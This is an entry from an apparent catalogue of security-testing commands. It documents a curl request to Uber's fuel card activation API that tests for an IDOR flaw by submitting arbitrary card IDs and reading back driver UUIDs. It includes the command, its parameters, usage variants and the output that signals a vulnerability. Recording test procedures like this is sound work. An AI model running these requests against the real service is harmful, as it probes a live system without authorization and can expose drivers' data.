---
data: >-
  curl -X POST 'https://api.uber.com/v1/fuelcards/activate' -H 'Authorization:
  Bearer YOUR_ACCESS_TOKEN' -H 'Content-Type: application/json' -d '{"card_id":
  1}'
tags:
  - api
  - test
  - idor
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:29.904Z'
id: dae8915e-a3fe-40c5-8dbd-3c580083aacf
verified: false
validated: true
submitted: true
---
# curl-activatefuelcard-test

## Command

```bash
curl -X POST 'https://api.uber.com/v1/fuelcards/activate' \
  -H 'Authorization: Bearer YOUR_ACCESS_TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{"card_id": 1}'
```

## Description

This command tests the Uber activateFuelCard API endpoint for IDOR by sending a POST request with a sample card ID (1) under an authenticated session, revealing the associated driver UUID if vulnerable.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP method | Yes |
| `https://api.uber.com/v1/fuelcards/activate` | Target endpoint URL | Yes |
| `-H 'Authorization: Bearer YOUR_ACCESS_TOKEN'` | Auth header with Bearer token | Yes |
| `-H 'Content-Type: application/json'` | Sets JSON content type | Yes |
| `-d '{"card_id": 1}'` | JSON payload with card ID | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://api.uber.com/v1/fuelcards/activate' \
  -H 'Authorization: Bearer YOUR_ACCESS_TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{"card_id": 1}'
```

### Advanced Usage

```bash
curl -X POST 'https://api.uber.com/v1/fuelcards/activate' \
  -H 'Authorization: Bearer YOUR_ACCESS_TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{"card_id": 42}' | jq '.'
```

## Expected Output

JSON response with driver details if vulnerable, e.g., {"success": true, "driver_uuid": "abc123-def456-ghi789"}. Errors like 404 indicate non-existent card, but no 403 confirms IDOR.

## Related

- [[Related Procedure]]
